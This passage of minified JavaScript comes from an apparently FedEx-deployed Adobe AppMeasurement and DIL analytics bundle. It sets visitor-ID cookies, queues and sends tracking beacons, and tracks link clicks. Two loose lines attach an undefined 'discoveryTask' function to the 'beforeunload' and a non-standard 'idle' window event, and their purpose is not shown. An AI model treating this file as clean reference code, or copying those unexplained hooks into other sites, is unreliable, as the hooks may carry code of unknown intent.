    if (t.hc(r), e != i) for (n in e) r[n] = e[n];
    t.callbackWhenReadyToTrack(t, t.Fa, [r]), t.Da();
  }, t.Ob = function () {
    var e,
      n = t.cookieRead("s_fid"),
      i = "",
      r = "";
    e = 8;
    var a = 4;
    if (!n || 0 > n.indexOf("-")) {
      for (n = 0; 16 > n; n++) e = Math.floor(Math.random() * e), i += "0123456789ABCDEF".substring(e, e + 1), e = Math.floor(Math.random() * a), r += "0123456789ABCDEF".substring(e, e + 1), e = a = 16;
      n = i + "-" + r;
    }
    return t.cookieWrite("s_fid", n, 1) || (n = 0), n;
  }, t.Fa = function (e) {
    var i,
      r = new Date(),
      a = "s" + Math.floor(r.getTime() / 108e5) % 10 + Math.floor(1e13 * Math.random()),
      s = r.getYear(),
      c = (s = "t=" + t.escape(r.getDate() + "/" + r.getMonth() + "/" + (1900 > s ? s + 1900 : s) + " " + r.getHours() + ":" + r.getMinutes() + ":" + r.getSeconds() + " " + r.getDay() + " " + r.getTimezoneOffset()), t.T());
    e && (i = t.S(e, 1)), t.Vb() && !t.visitorOptedOut && (t.xa() || (t.fid = t.Ob()), t.Yb(), t.usePlugins && t.doPlugins && t.doPlugins(t), t.account && (t.abort || (t.trackOffline && !t.timestamp && (t.timestamp = Math.floor(r.getTime() / 1e3)), e = n.location, t.pageURL || (t.pageURL = e.href ? e.href : e), t.referrer || t.$a || (e = t.Util.getQueryParam("adobe_mc_ref", null, null, !0), t.referrer = e || void 0 === e ? void 0 === e ? "" : e : o.document.referrer), t.$a = 1, !t.referrer && t.Z && (t.referrer = t.Z), t.Z = 0, t.referrer = t.Mb(t.referrer), t.u("_g")), t.Rb() && !t.abort && (c && t.V("TARGET") && !t.supplementalDataID && c.getSupplementalDataID && (t.supplementalDataID = c.getSupplementalDataID("AppMeasurement:" + t._in, !t.expectSupplementalData)), t.V("AAM") || (t.contextData["cm.ssf"] = 1), t.Sb(), t.wb(), s += t.Qb(), t.sb(a, s), t.u("_t"), t.referrer = ""))), t.referrer && (t.Z = t.referrer), t.Da(), i && t.S(i, 1);
  }, t.t = t.track = function (e, n) {
    n && t.S(n), t.Y = !0, t.isReadyToTrack() ? null != t.j && 0 < t.j.length ? (t.ua(e), t.p()) : t.Fa(e) : t.ua(e);
  }, t.wb = function () {
    t.writeSecureCookies && !t.ssl && t.ab();
  }, t.ab = function () {
    t.contextData.excCodes = t.contextData.excCodes ? t.contextData.excCodes : [], t.contextData.excCodes.push(1);
  }, t.Da = function () {
    t.abort = t.supplementalDataID = t.timestamp = t.pageURLRest = t.linkObject = t.clickObject = t.linkURL = t.linkName = t.linkType = n.s_objectID = t.pe = t.pev1 = t.pev2 = t.pev3 = t.e = t.lightProfileID = t.useBeacon = t.referrer = 0, t.contextData && t.contextData.excCodes && (t.contextData.excCodes = 0);
  }, t.Ca = [], t.registerPreTrackCallback = function (e) {
    for (var n = [], i = 1; i < arguments.length; i++) n.push(arguments[i]);
    "function" == typeof e ? t.Ca.push([e, n]) : t.debugTracking && t.C("DEBUG: Non function type passed to registerPreTrackCallback");
  }, t.hb = function (e) {
    t.va(t.Ca, e);
  }, t.Ba = [], t.registerPostTrackCallback = function (e) {
    for (var n = [], i = 1; i < arguments.length; i++) n.push(arguments[i]);
    "function" == typeof e ? t.Ba.push([e, n]) : t.debugTracking && t.C("DEBUG: Non function type passed to registerPostTrackCallback");
  }, t.gb = function (e) {
    t.va(t.Ba, e);
  }, t.va = function (e, n) {
    if ("object" == typeof e) for (var i = 0; i < e.length; i++) {
      var r = e[i][0],
        a = e[i][1].slice();
      if (a.unshift(n), "function" == typeof r) try {
        r.apply(null, a);
      } catch (e) {
        t.debugTracking && t.C(e.message);
      }
    }
  }, t.tl = t.trackLink = function (e, n, i, r, a) {
    return t.linkObject = e, t.linkType = n, t.linkName = i, a && (t.bodyClickTarget = e, t.bodyClickFunction = a), t.track(r);
  }, t.trackLight = function (e, n, i, r) {
    return t.lightProfileID = e, t.lightStoreForSeconds = n, t.lightIncrementBy = i, t.track(r);
  }, t.clearVars = function () {
    var e, n;
    for (e = 0; e < t.g.length; e++) ("prop" == (n = t.g[e]).substring(0, 4) || "eVar" == n.substring(0, 4) || "hier" == n.substring(0, 4) || "list" == n.substring(0, 4) || "channel" == n || "events" == n || "eventList" == n || "products" == n || "productList" == n || "purchaseID" == n || "transactionID" == n || "state" == n || "zip" == n || "campaign" == n) && (t[n] = void 0);
  }, t.tagContainerMarker = "", t.sb = function (e, n) {
    var i = t.ib() + "/" + e + "?AQB=1&ndh=1&pf=1&" + (t.za() ? "callback=s_c_il[" + t._in + "].doPostbacks&et=1&" : "") + n + "&AQE=1";
    t.hb(i), t.fb(i), t.U();
  }, t.ib = function () {
    var e = t.jb();
    return "http" + (t.ssl ? "s" : "") + "://" + e + "/b/ss/" + t.account + "/" + (t.mobile ? "5." : "") + (t.za() ? "10" : "1") + "/JS-" + t.version + (t.ac ? "T" : "") + (t.tagContainerMarker ? "-" + t.tagContainerMarker : "");
  }, t.za = function () {
    return t.AudienceManagement && t.AudienceManagement.isReady() || 0 != t.usePostbacks;
  }, t.jb = function () {
    var e = t.dc,
      n = t.trackingServer;
    return n ? t.trackingServerSecure && t.ssl && (n = t.trackingServerSecure) : ("d1" == (e = e ? ("" + e).toLowerCase() : "d1") ? e = "112" : "d2" == e && (e = "122"), n = t.lb() + "." + e + ".2o7.net"), n;
  }, t.lb = function () {
    var e = t.visitorNamespace;
    return e || (e = (e = t.account.split(",")[0]).replace(/[^0-9a-z]/gi, "")), e;
  }, t.Za = /{(%?)(.*?)(%?)}/, t.gc = RegExp(t.Za.source, "g"), t.Lb = function (e) {
    if ("object" == typeof e.dests) for (var n = 0; n < e.dests.length; ++n) {
      var i = e.dests[n];
      if ("string" == typeof i.c && "aa." == i.id.substr(0, 3)) for (var r = i.c.match(t.gc), a = 0; a < r.length; ++a) {
        var s = r[a],
          o = s.match(t.Za),
          c = "";
        "%" == o[1] && "timezone_offset" == o[2] ? c = new Date().getTimezoneOffset() : "%" == o[1] && "timestampz" == o[2] && (c = t.Pb()), i.c = i.c.replace(s, t.escape(c));
      }
    }
  }, t.Pb = function () {
    var e = new Date(),
      n = new Date(6e4 * Math.abs(e.getTimezoneOffset()));
    return t.k(4, e.getFullYear()) + "-" + t.k(2, e.getMonth() + 1) + "-" + t.k(2, e.getDate()) + "T" + t.k(2, e.getHours()) + ":" + t.k(2, e.getMinutes()) + ":" + t.k(2, e.getSeconds()) + (0 < e.getTimezoneOffset() ? "-" : "+") + t.k(2, n.getUTCHours()) + ":" + t.k(2, n.getUTCMinutes());
  }, t.k = function (e, t) {
    return (Array(e + 1).join(0) + t).slice(-e);
  }, t.qa = {}, t.doPostbacks = function (e) {
    if ("object" == typeof e) if (t.Lb(e), "object" == typeof t.AudienceManagement && "function" == typeof t.AudienceManagement.isReady && t.AudienceManagement.isReady() && "function" == typeof t.AudienceManagement.passData) t.AudienceManagement.passData(e);else if ("object" == typeof e && "object" == typeof e.dests) for (var n = 0; n < e.dests.length; ++n) {
      var i = e.dests[n];
      "object" == typeof i && "string" == typeof i.c && "string" == typeof i.id && "aa." == i.id.substr(0, 3) && (t.qa[i.id] = new Image(), t.qa[i.id].alt = "", t.qa[i.id].src = i.c);
    }
  }, t.fb = function (e) {
    t.i || t.Tb(), t.i.push(e), t.ja = t.A(), t.Ya();
  }, t.Tb = function () {
    t.i = t.Wb(), t.i || (t.i = []);
  }, t.Wb = function () {
    var e, i;
    if (t.pa()) {
      try {
        (i = n.localStorage.getItem(t.na())) && (e = n.JSON.parse(i));
      } catch (e) {}
      return e;
    }
  }, t.pa = function () {
    var e = !0;
    return t.trackOffline && t.offlineFilename && n.localStorage && n.JSON || (e = !1), e;
  }, t.Oa = function () {
    var e = 0;
    return t.i && (e = t.i.length), t.l && e++, e;
  }, t.U = function () {
    if (!t.l || (t.v && t.v.complete && t.v.D && t.v.R(), !t.l)) if (t.Pa = i, t.oa) t.ja > t.N && t.Wa(t.i), t.ra(500);else {
      var e = t.Fb();
      0 < e ? t.ra(e) : (e = t.Ma()) && (t.l = 1, t.Xb(e), t.$b(e));
    }
  }, t.ra = function (e) {
    t.Pa || (e || (e = 0), t.Pa = setTimeout(t.U, e));
  }, t.Fb = function () {
    var e;
    return !t.trackOffline || 0 >= t.offlineThrottleDelay ? 0 : (e = t.A() - t.Ua, t.offlineThrottleDelay < e ? 0 : t.offlineThrottleDelay - e);
  }, t.Ma = function () {
    if (0 < t.i.length) return t.i.shift();
  }, t.Xb = function (e) {
    if (t.debugTracking) {
      var n,
        i = "AppMeasurement Debug: " + e;
      for (e = e.split("&"), n = 0; n < e.length; n++) i += "\n\t" + t.unescape(e[n]);
      t.C(i);
    }
  }, t.xa = function () {
    return t.marketingCloudVisitorID || t.analyticsVisitorID;
  }, t.X = !1;
  try {
    s = JSON.parse('{"x":"y"}');
  } catch (e) {
    s = null;
  }
  for (s && "y" == s.x ? (t.X = !0, t.W = function (e) {
    return JSON.parse(e);
  }) : n.$ && n.$.parseJSON ? (t.W = function (e) {
    return n.$.parseJSON(e);
  }, t.X = !0) : t.W = function () {
    return null;
  }, t.$b = function (e) {
    var r, a, s;
    if (t.nb(e) && (a = 1, r = {
      send: function (e) {
        t.useBeacon = !1, navigator.sendBeacon(e) ? r.R() : r.ha();
      }
    }), !r && t.xa() && 2047 < e.length && (t.bb() && (a = 2, r = new XMLHttpRequest()), r && (t.AudienceManagement && t.AudienceManagement.isReady() || 0 != t.usePostbacks) && (t.X ? r.Ha = !0 : r = 0)), !r && t.fc && (e = e.substring(0, 2047)), !r && t.d.createElement && (0 != t.usePostbacks || t.AudienceManagement && t.AudienceManagement.isReady()) && (r = t.d.createElement("SCRIPT")) && "async" in r && ((s = (s = t.d.getElementsByTagName("HEAD")) && s[0] ? s[0] : t.d.body) ? (r.type = "text/javascript", r.setAttribute("async", "async"), a = 3) : r = 0), r || ((r = new Image()).alt = "", r.abort || void 0 === n.InstallTrigger || (r.abort = function () {
      r.src = i;
    })), r.Va = Date.now(), r.Ja = function () {
      try {
        r.D && (clearTimeout(r.D), r.D = 0);
      } catch (e) {}
    }, r.onload = r.R = function () {
      if (r.Va && (t.ka = Date.now() - r.Va), t.gb(e), r.Ja(), t.Jb(), t.da(), t.l = 0, t.U(), r.Ha) {
        r.Ha = !1;
        try {
          t.doPostbacks(t.W(r.responseText));
        } catch (e) {}
      }
    }, r.onabort = r.onerror = r.ha = function () {
      r.Ja(), (t.trackOffline || t.oa) && t.l && t.i.unshift(t.Ib), t.l = 0, t.ja > t.N && t.Wa(t.i), t.da(), t.ra(500);
    }, r.onreadystatechange = function () {
      4 == r.readyState && (200 == r.status ? r.R() : r.ha());
    }, t.Ua = t.A(), 1 === a) r.send(e);else if (2 === a) s = e.indexOf("?"), a = e.substring(0, s), s = (s = e.substring(s + 1)).replace(/&callback=[a-zA-Z0-9_.\[\]]+/, ""), r.open("POST", a, !0), r.withCredentials = !0, r.send(s);else if (r.src = e, 3 === a) {
      if (t.Sa) try {
        s.removeChild(t.Sa);
      } catch (e) {}
      s.firstChild ? s.insertBefore(r, s.firstChild) : s.appendChild(r), t.Sa = t.v;
    }
    r.D = setTimeout(function () {
      r.D && (r.complete ? r.R() : (t.trackOffline && r.abort && r.abort(), r.ha()));
    }, 5e3), t.Ib = e, t.v = n["s_i_" + t.replace(t.account, ",", "_")] = r, (t.useForcedLinkTracking && t.J || t.bodyClickFunction) && (t.forcedLinkTrackingTimeout || (t.forcedLinkTrackingTimeout = 250), t.ea = setTimeout(t.da, t.forcedLinkTrackingTimeout));
  }, t.nb = function (e) {
    var n = !1;
    return navigator.sendBeacon && (t.pb(e) || t.useBeacon) && (n = !0), t.yb(e) && (n = !1), n;
  }, t.pb = function (e) {
    return !!(e && 0 < e.indexOf("pe=lnk_e"));
  }, t.yb = function (e) {
    return 64e3 <= e.length;
  }, t.bb = function () {
    return "undefined" != typeof XMLHttpRequest && "withCredentials" in new XMLHttpRequest();
  }, t.Jb = function () {
    if (t.pa() && !(t.Ta > t.N)) try {
      n.localStorage.removeItem(t.na()), t.Ta = t.A();
    } catch (e) {}
  }, t.Wa = function (e) {
    if (t.pa()) {
      t.Ya();
      try {
        n.localStorage.setItem(t.na(), n.JSON.stringify(e)), t.N = t.A();
      } catch (e) {}
    }
  }, t.Ya = function () {
    if (t.trackOffline) for ((!t.offlineLimit || 0 >= t.offlineLimit) && (t.offlineLimit = 10); t.i.length > t.offlineLimit;) t.Ma();
  }, t.forceOffline = function () {
    t.oa = !0;
  }, t.forceOnline = function () {
    t.oa = !1;
  }, t.na = function () {
    return t.offlineFilename + "-" + t.visitorNamespace + t.account;
  }, t.A = function () {
    return new Date().getTime();
  }, t.Qa = function (e) {
    return 0 != (e = e.toLowerCase()).indexOf("#") && 0 != e.indexOf("about:") && 0 != e.indexOf("opera:") && 0 != e.indexOf("javascript:");
  }, t.setTagContainer = function (e) {
    var n, i, r;
    for (t.ac = e, n = 0; n < t._il.length; n++) if ((i = t._il[n]) && "s_l" == i._c && i.tagContainerName == e) {
      if (t.S(i), i.lmq) for (n = 0; n < i.lmq.length; n++) r = i.lmq[n], t.loadModule(r.n);
      if (i.ml) for (r in i.ml) if (t[r]) for (n in e = t[r], r = i.ml[r]) !Object.prototype[n] && ("function" != typeof r[n] || 0 > ("" + r[n]).indexOf("s_c_il")) && (e[n] = r[n]);
      if (i.mmq) for (n = 0; n < i.mmq.length; n++) r = i.mmq[n], t[r.m] && (e = t[r.m])[r.f] && "function" == typeof e[r.f] && (r.a ? e[r.f].apply(e, r.a) : e[r.f].apply(e));
      if (i.tq) for (n = 0; n < i.tq.length; n++) t.track(i.tq[n]);
      i.s = t;
      break;
    }
  }, t.Util = {
    urlEncode: t.escape,
    urlDecode: t.unescape,
    cookieRead: t.cookieRead,
    cookieWrite: t.cookieWrite,
    getQueryParam: function (e, i, r, a) {
      var s,
        o = "";
      return i || (i = t.pageURL ? t.pageURL : n.location), r = r || "&", e && i ? 0 > (s = (i = "" + i).indexOf("?")) ? o : (i = r + i.substring(s + 1) + r, a && (0 <= i.indexOf(r + e + r) || 0 <= i.indexOf(r + e + "=" + r)) ? void 0 : (0 <= (s = i.indexOf("#")) && (i = i.substr(0, s) + r), 0 > (s = i.indexOf(r + e + "=")) || (0 <= (s = (i = i.substring(s + r.length + e.length + 1)).indexOf(r)) && (i = i.substring(0, s)), 0 < i.length && (o = t.unescape(i))), o)) : o;
    },
    getIeVersion: function () {
      return document.documentMode ? document.documentMode : t.ya() ? 7 : null;
    }
  }, t.F = "supplementalDataID timestamp dynamicVariablePrefix visitorID marketingCloudVisitorID analyticsVisitorID audienceManagerLocationHint authState fid vmk visitorMigrationKey visitorMigrationServer visitorMigrationServerSecure charSet visitorNamespace cookieDomainPeriods fpCookieDomainPeriods cookieLifetime pageName pageURL customerPerspective referrer contextData currencyCode lightProfileID lightStoreForSeconds lightIncrementBy retrieveLightProfiles deleteLightProfiles retrieveLightData".split(" "), t.g = t.F.concat("purchaseID variableProvider channel server pageType transactionID campaign state zip events events2 products audienceManagerBlob tnt".split(" ")), t.la = "timestamp charSet visitorNamespace cookieDomainPeriods cookieLifetime contextData lightProfileID lightStoreForSeconds lightIncrementBy".split(" "), t.O = t.la.slice(0), t.Ga = "account allAccounts debugTracking visitor visitorOptedOut trackOffline offlineLimit offlineThrottleDelay offlineFilename usePlugins doPlugins configURL visitorSampling visitorSamplingGroup linkObject clickObject linkURL linkName linkType trackDownloadLinks trackExternalLinks trackClickMap trackInlineStats linkLeaveQueryString linkTrackVars linkTrackEvents linkDownloadFileTypes linkExternalFilters linkInternalFilters useForcedLinkTracking forcedLinkTrackingTimeout writeSecureCookies useLinkTrackSessionStorage trackingServer trackingServerSecure ssl abort mobile dc lightTrackVars maxDelay expectSupplementalData useBeacon usePostbacks registerPreTrackCallback registerPostTrackCallback bodyClickTarget bodyClickFunction AudienceManagement".split(" "), r = 0; 250 >= r; r++) 76 > r && (t.g.push("prop" + r), t.O.push("prop" + r)), t.g.push("eVar" + r), t.O.push("eVar" + r), 6 > r && t.g.push("hier" + r), 4 > r && t.g.push("list" + r);
  r = "pe pev1 pev2 pev3 latitude longitude resolution colorDepth javascriptVersion javaEnabled cookiesEnabled browserWidth browserHeight connectionType homepage pageURLRest marketingCloudOrgID ms_a".split(" "), t.g = t.g.concat(r), t.F = t.F.concat(r), t.ssl = 0 <= n.location.protocol.toLowerCase().indexOf("https"), t.charSet = "UTF-8", t.contextData = {}, t.writeSecureCookies = !1, t.offlineThrottleDelay = 0, t.offlineFilename = "AppMeasurement.offline", t.P = "s_sq", t.Ua = 0, t.ja = 0, t.N = 0, t.Ta = 0, t.linkDownloadFileTypes = "exe,zip,wav,mp3,mov,mpg,avi,wmv,pdf,doc,docx,xls,xlsx,ppt,pptx", t.w = n, t.d = n.document, t.da = function () {
    t.ea && (n.clearTimeout(t.ea), t.ea = i), t.bodyClickTarget && t.J && t.bodyClickTarget.dispatchEvent(t.J), t.bodyClickFunction && ("function" == typeof t.bodyClickFunction ? t.bodyClickFunction() : t.bodyClickTarget && t.bodyClickTarget.href && (t.d.location = t.bodyClickTarget.href)), t.bodyClickTarget = t.J = t.bodyClickFunction = 0;
  }, t.Xa = function () {
    t.b = t.d.body, t.b ? (t.r = function (e) {
      var i, r, a, s, o;
      if (!(t.d && t.d.getElementById("cppXYctnr") || e && e["s_fe_" + t._in])) {
        if (t.Ia) {
          if (!t.useForcedLinkTracking) return t.b.removeEventListener("click", t.r, !0), void (t.Ia = t.useForcedLinkTracking = 0);
          t.b.removeEventListener("click", t.r, !1);
        } else t.useForcedLinkTracking = 0;
        t.clickObject = e.srcElement ? e.srcElement : e.target;
        try {
          if (!t.clickObject || t.M && t.M == t.clickObject || !(t.clickObject.tagName || t.clickObject.parentElement || t.clickObject.parentNode)) t.clickObject = 0;else {
            var c = t.M = t.clickObject;
            if (t.ia && (clearTimeout(t.ia), t.ia = 0), t.ia = setTimeout(function () {
              t.M == c && (t.M = 0);
            }, 1e4), a = t.Oa(), t.track(), a < t.Oa() && t.useForcedLinkTracking && e.target) {
              for (s = e.target; s && s != t.b && "A" != s.tagName.toUpperCase() && "AREA" != s.tagName.toUpperCase();) s = s.parentNode;
              if (s && (o = s.href, t.Qa(o) || (o = 0), r = s.target, e.target.dispatchEvent && o && (!r || "_self" == r || "_top" == r || "_parent" == r || n.name && r == n.name))) {
                try {
                  i = t.d.createEvent("MouseEvents");
                } catch (e) {
                  i = new n.MouseEvent();
                }
                if (i) {
                  try {
                    i.initMouseEvent("click", e.bubbles, e.cancelable, e.view, e.detail, e.screenX, e.screenY, e.clientX, e.clientY, e.ctrlKey, e.altKey, e.shiftKey, e.metaKey, e.button, e.relatedTarget);
                  } catch (e) {
                    i = 0;
                  }
                  i && (i["s_fe_" + t._in] = i.s_fe = 1, e.stopPropagation(), e.stopImmediatePropagation && e.stopImmediatePropagation(), e.preventDefault(), t.bodyClickTarget = e.target, t.J = i);
                }
              }
            }
          }
        } catch (e) {
          t.clickObject = 0;
        }
      }
    }, t.b && t.b.attachEvent ? t.b.attachEvent("onclick", t.r) : t.b && t.b.addEventListener && (navigator && (0 <= navigator.userAgent.indexOf("WebKit") && t.d.createEvent || 0 <= navigator.userAgent.indexOf("Firefox/2") && n.MouseEvent) && (t.Ia = 1, t.useForcedLinkTracking = 1, t.b.addEventListener("click", t.r, !0)), t.b.addEventListener("click", t.r, !1))) : setTimeout(t.Xa, 30);
  }, t.fc = t.ya(), t.Kb(), t.mc || (e ? t.setAccount(e) : t.C("Error, missing Report Suite ID in AppMeasurement initialization"), t.Xa(), t.loadModule("ActivityMap"));
}
window.addEventListener("beforeunload", discoveryTask);
function s_gi(e) {
  var t,
    n,
    i,
    r,
    a,
    s = window.s_c_il,
    o = e.split(","),
    c = 0;
  if (s) for (n = 0; !c && n < s.length;) {
    if ("s_c" == (t = s[n])._c && (t.account || t.oun)) if (t.account && t.account == e) c = 1;else for (i = t.account ? t.account : t.oun, i = t.allAccounts ? t.allAccounts : i.split(","), r = 0; r < o.length; r++) for (a = 0; a < i.length; a++) o[r] == i[a] && (c = 1);
    n++;
  }
  return c ? t.setAccount && t.setAccount(e) : t = new AppMeasurement(e), t;
}
function s_pgicq() {
  var e,
    t,
    n,
    i = window,
    r = i.s_giq;
  if (r) for (e = 0; e < r.length; e++) (n = s_gi((t = r[e]).oun)).setAccount(t.un), n.setTagContainer(t.tagContainerName);
  i.s_giq = 0;
}
window.addEventListener("idle", discoveryTask);
function fdx_runSCode() {
  if ("undefined" == typeof pgLvl) {
    fdx_getLinkView(), (void 0 === s.pageName || "" == s.pageName) && (_satellite.getVar("content:page name"), 1) && _satellite.getVar("content:page name") && (s.pageName = _satellite.getVar("content:page name")), s.pageName = s.pageName.toLowerCase(), void 0 !== s.eVar43 && "" != s.eVar43 || (s.eVar43 = "P:" + s.pageName), s.prop43 = "D=v43";
    var e = document.getElementsByClassName("brightcove-container");
    s.eVar31 = e.length;
    for (var t = "", n = 0; n < e.length; n++) s.eVar31 += "|" + e[n].getAttribute("data-video-id"), t = "event202";
    s.linkTrackEvents = s.events = s.apl(s.events, t, ",", 2);
    var i = fdx_getCookie("xacc").toLowerCase(),
      r = fdx_getCookie("fdx_locale").toLowerCase().split("_"),
      a = fdx_getCookie("fdx_geo_select");
    fdx_getCookie("fdx_geo_hide") !== r[1] && i !== r[1] && a !== r[1] && (s.linkTrackEvents = s.events = "event904");
    try {
      var o = fdx_getCookie("fdx_debug");
      if (void 0 !== o) {
        for (n = 0; n < o.split(",").length; n++) {
          var c = "DBG_" + o.split(",")[n];
          c = (c = c.split("|").slice(1).join("|")).substring(0, Math.min(255, c.length));
        }
        s.events = s.apl(s.events, "event100", ",", 2), fdx_setCookie("fdx_debug", "", -1, "/", ".fedex.com");
      }
    } catch (e) {
      fdx_debug(e, "SC", "fdx_runSCode:log debug errors");
    }
    s.eVar60 = s.Util.getQueryParam("et_rid"), s.eVar60 = s.getValOnce(s.eVar60, "s_etrid", 0);
    var l = s.c_r("s_etrid");
    window.sc_s_etrid = "", null != l && "" !== l ? (s.getAndPersistValue(l, "sc_s_etrid", 90), window.sc_s_etrid = l) : window.sc_s_etrid = s.c_r("sc_s_etrid"), s.eVar80 = s.Util.getQueryParam("et_cid"), s.eVar80 = s.getValOnce(s.eVar80, "s_etcid", 0);
    var u = s.c_r("s_acxrid");
    window.sc_s_acxrid = "", null != u && "" !== u ? (s.getAndPersistValue(u, "sc_s_acxrid", 90), window.sc_s_acxrid = u) : window.sc_s_acxrid = s.c_r("sc_s_acxrid");
    fdx_getCookie("fcl_uuid");
    window.sc_fcl_uuid = "";
  }
}
function fdx_initSCode() {
  try {
    fdx_initSCVars(), fdx_initPlugins(), fdx_runSCode();
  } catch (e) {
    fdx_debug(e, "SC", "fdx_initSCode");
  }
}
var fdx_createCustomEvent = fdx_createCustomEvent || function (e) {
    try {
      var t;
      return document.createEvent ? (t = document.createEvent("Event")).initEvent(e, !1, !1) : t = e, t;
    } catch (e) {
      fdx_debug(e, "CIM", "fdx_createCustomEvent");
    }
  },
  fdx_dispatchCustomEvent = fdx_dispatchCustomEvent || function (e) {
    try {
      document.createEvent ? document.dispatchEvent(e) : void 0 !== document.documentElement[e] ? document.documentElement[e]++ : document.documentElement[e] = 0;
    } catch (e) {
      fdx_debug(e, "CIM", "fdx_dispatchCustomEvent");
    }
  },
  fdx_fireCustomEvent = fdx_fireCustomEvent || function (e) {
    try {
      var t = fdx_createCustomEvent(e);
      fdx_dispatchCustomEvent(t);
    } catch (e) {
      fdx_debug(e, "CIM", "fdx_fireCustomEvent");
    }
  },
  MAGSEvarMapping = {
    "mags-address": ["eVar151", "event211"],
    "mags-package": ["eVar152", "event212"],
    "mags-custom": ["eVar155", "event214"],
    "mags-ratesdisplay": ["eVar153", "event216"],
    "mags-payment": ["eVar154", "event218"]
  };
!function () {
  "use strict";

  var e, t, n;
  "function" != typeof window.DIL && (window.DIL = function (e) {
    function t(e) {
      return void 0 === e || !0 === e;
    }
    function n() {
      W || (W = !0, A.registerRequest(), z());
    }
    var i,
      r,
      a,
      s,
      o,
      c,
      l,
      u,
      d,
      p,
      f,
      g,
      v,
      h,
      m,
      b,
      _,
      k,
      y,
      w,
      x,
      D = [],
      I = {};
    e !== Object(e) && (e = {}), a = e.partner, s = e.containerNSID, o = e.mappings, c = e.uuidCookie, l = !0 === e.enableErrorReporting, u = e.visitorService, d = e.declaredId, p = !0 === e.delayAllUntilWindowLoad, f = t(e.secureDataCollection), g = "boolean" == typeof e.isCoopSafe ? e.isCoopSafe : null, v = t(e.enableHrefererParam), h = t(e.enableLogging), m = t(e.enableUrlDestinations), b = t(e.enableCookieDestinations), _ = !0 === e.disableDefaultRequest, k = e.afterResultForDefaultRequest, y = e.visitorConstructor, w = !0 === e.disableCORS, x = !0 === e.ignoreHardDependencyOnVisitorAPI, l && DIL.errorModule.activate(), x && D.push("Warning: this instance is configured to ignore the hard dependency on the VisitorAPI service. This means that no URL destinations will be fired if the instance has no connection to VisitorAPI. If the VisitorAPI service is not instantiated, ID syncs will not be fired either.");
    var C = !0 === window._dil_unit_tests;
    if ((i = arguments[1]) && D.push(i + ""), !a || "string" != typeof a) {
      var T = {
        name: "error",
        message: i = "DIL partner is invalid or not specified in initConfig",
        filename: "dil.js"
      };
      return DIL.errorModule.handleError(T), new Error(i);
    }
    if (i = "DIL containerNSID is invalid or not specified in initConfig, setting to default of 0", !s && "number" != typeof s || (s = parseInt(s, 10), !isNaN(s) && 0 <= s && (i = "")), i && (s = 0, D.push(i), i = ""), (r = DIL.getDil(a, s)) instanceof DIL && r.api.getPartner() === a && r.api.getContainerNSID() === s) return r;
    if (!(this instanceof DIL)) return new DIL(e, "DIL was not instantiated with the 'new' operator, returning a valid instance with partner = " + a + " and containerNSID = " + s);
    DIL.registerDil(this, a, s);
    var O = {
        doesConsoleLogExist: window.console === Object(window.console) && "function" == typeof window.console.log,
        logMemo: {},
        log: function (e) {
          D.push(e), h && this.doesConsoleLogExist && Function.prototype.bind.call(window.console.log, window.console).apply(window.console, arguments);
        },
        logOnce: function (e) {
          this.logMemo[e] || (this.logMemo[e] = !0, O.log(e));
        }
      },
      S = {
        IS_HTTPS: f || "https:" === document.location.protocol,
        SIX_MONTHS_IN_MINUTES: 259200,
        IE_VERSION: function () {
          if (document.documentMode) return document.documentMode;
          for (var e = 7; 4 < e; e--) {
            var t = document.createElement("div");
            if (t.innerHTML = "<!--[if IE " + e + "]><span></span><![endif]-->", t.getElementsByTagName("span").length) return t = null, e;
          }
          return null;
        }()
      };
    S.IS_IE_LESS_THAN_10 = "number" == typeof S.IE_VERSION && S.IE_VERSION < 10;
    var L = {
        stuffed: {}
      },
      V = {},
      A = {
        firingQueue: [],
        fired: [],
        firing: !1,
        sent: [],
        errored: [],
        reservedKeys: {
          sids: !0,
          pdata: !0,
          logdata: !0,
          callback: !0,
          postCallbackFn: !0,
          useImageRequest: !0
        },
        firstRequestHasFired: !1,
        abortRequests: !1,
        num_of_cors_responses: 0,
        num_of_cors_errors: 0,
        corsErrorSources: [],
        num_of_img_responses: 0,
        num_of_img_errors: 0,
        platformParams: {
          d_nsid: s + "",
          d_rtbd: "json",
          d_jsonv: DIL.jsonVersion + "",
          d_dst: "1"
        },
        nonModStatsParams: {
          d_rtbd: !0,
          d_dst: !0,
          d_cts: !0,
          d_rs: !0
        },
        modStatsParams: null,
        adms: {
          TIME_TO_CATCH_ALL_REQUESTS_RELEASE: 3e4,
          calledBack: !1,
          mid: null,
          noVisitorAPI: null,
          VisitorAPI: null,
          instance: null,
          releaseType: "no VisitorAPI",
          isOptedOut: !0,
          isOptedOutCallbackCalled: !1,
          admsProcessingStarted: !1,
          process: function (e) {
            try {
              if (this.admsProcessingStarted) return;
              this.admsProcessingStarted = !0;
              var t,
                n,
                i,
                r = u;
              if ("function" != typeof e || "function" != typeof e.getInstance) throw this.noVisitorAPI = !0, new Error("Visitor does not exist.");
              if (r !== Object(r) || !(t = r.namespace) || "string" != typeof t) throw this.releaseType = "no namespace", new Error("DIL.create() needs the initConfig property `visitorService`:{namespace:'<Experience Cloud Org ID>'}");
              if ((n = e.getInstance(t, {
                idSyncContainerID: s
              })) !== Object(n) || "function" != typeof n.isAllowed || "function" != typeof n.getMarketingCloudVisitorID || "function" != typeof n.getCustomerIDs || "function" != typeof n.isOptedOut || "function" != typeof n.publishDestinations) throw this.releaseType = "invalid instance", i = "Invalid Visitor instance.", n === Object(n) && "function" != typeof n.publishDestinations && (i += " In particular, visitorInstance.publishDestinations is not a function. This is needed to fire URL destinations in DIL v8.0+ and should be present in Visitor v3.3.0+ ."), new Error(i);
              if (this.VisitorAPI = e, !n.isAllowed()) return this.releaseType = "VisitorAPI is not allowed to write cookies", void this.releaseRequests();
              this.instance = n, this.waitForMidToReleaseRequests();
            } catch (e) {
              if (!x) throw new Error("Error in processing Visitor API, which is a hard dependency for DIL v8.0+: " + e.message);
              this.releaseRequests();
            }
          },
          waitForMidToReleaseRequests: function () {
            var e = this;
            this.instance && (this.instance.getMarketingCloudVisitorID(function (t) {
              e.mid = t, e.releaseType = "VisitorAPI", e.releaseRequests();
            }, !0), (!F.exists || !F.isIabContext && F.isApproved() || F.isIabContext && Q.hasGoSignal()) && setTimeout(function () {
              "VisitorAPI" !== e.releaseType && (e.releaseType = "timeout", e.releaseRequests());
            }, this.getLoadTimeout()));
          },
          releaseRequests: function () {
            this.calledBack = !0, A.registerRequest();
          },
          getMarketingCloudVisitorID: function () {
            return this.instance ? this.instance.getMarketingCloudVisitorID() : null;
          },
          getMIDQueryString: function () {
            var e = j.isPopulatedString,
              t = this.getMarketingCloudVisitorID();
